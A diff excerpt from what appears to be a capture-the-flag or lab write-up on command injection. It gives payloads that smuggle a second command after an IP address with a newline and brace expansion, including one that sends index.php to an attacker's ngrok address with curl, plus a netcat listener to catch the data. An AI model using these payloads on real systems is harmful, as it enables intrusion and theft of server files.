@@ -11,3 +11,10 @@ We can then use brace expansion to bypass space and execute our command.
 EX:
 payload :``8.8.8.8%0A{curl,127.0.0.1:9999}``
 
+send file contents as body entity using cURL.
+
+payload: ``8.8.8.8%0A{curl,--data,"@index.php",[your ngrok]}
+
+Then, to capture requests, use netcat: ``nc -nlvp 9999``
+
+![img](./img/1.png)
